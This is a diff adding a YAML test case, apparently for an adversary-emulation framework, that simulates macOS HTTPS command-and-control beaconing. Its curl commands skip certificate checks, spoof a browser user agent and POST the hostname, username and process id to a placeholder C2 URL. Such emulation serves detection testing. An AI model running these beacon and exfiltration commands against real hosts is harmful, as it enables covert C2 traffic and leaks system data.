@@ -1,0 +1,80 @@
+api_version: 2.0
+id: 004-https-beacon-custom-headers
+name: HTTPS Beacon with Custom Headers
+description: Simulates HTTPS beacon communication with custom headers for C2
+type: command_and_control
+
+requirements:
+  platforms:
+    - os: darwin
+
+args:
+  - name: c2_url
+    type: string
+    description: C2 server HTTPS URL
+    default: "https://api.example.com"
+  - name: api_key
+    type: string
+    description: API key for authentication
+    default: "secret-key-12345"
+  - name: user_agent
+    type: string
+    description: Custom user agent
+    default: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
+  - name: beacon_path
+    type: string
+    description: Beacon endpoint
+    default: "/beacon"
+  - name: timeout
+    type: integer
+    description: Request timeout in seconds
+    default: 10
+
+steps:
+  - name: https_beacon_with_headers
+    description: Send HTTPS beacon with custom headers
+    command: |
+      curl -s -k --max-time {{ timeout }} \
+        -A "{{ user_agent }}" \
+        -H "Authorization: Bearer {{ api_key }}" \
+        -H "X-Beacon-ID: $(uuidgen)" \
+        -H "X-System-Info: macOS" \
+        "{{ c2_url }}{{ beacon_path }}" \
+        -w "\nHTTP Status: %{http_code}\n"
+    type: command
+  
+  - name: https_beacon_post
+    description: POST beacon with system metadata
+    command: |
+      curl -s -k --max-time {{ timeout }} \
+        -X POST "{{ c2_url }}{{ beacon_path }}" \
+        -A "{{ user_agent }}" \
+        -H "Authorization: Bearer {{ api_key }}" \
+        -H "Content-Type: application/json" \
+        -H "X-UUID: $(uuidgen)" \
+        -d "{\"hostname\":\"$(hostname)\",\"user\":\"$(whoami)\",\"pid\":\"$$\"}" \
+        -w "\nHTTP Status: %{http_code}\n"
+    type: command
+    cleanup: true
+
+checks:
+  - name: verify_https_response
+    description: Verify HTTPS beacon connectivity
+    condition: |
+      Should receive HTTP 200, 301, 302, or 404 response
+    type: output_validation
+
+test_type: dry_run
+
+cleanup:
+  - name: clear_ssl_cache
+    description: Clear SSL session cache
+    command: rm -f ~/.curl/* 2>/dev/null || true
+    type: command
+    optional: true
+
+metadata:
+  created: 2026-01-30
+  author: Claude Code
+  severity: medium
+  category: network_communication
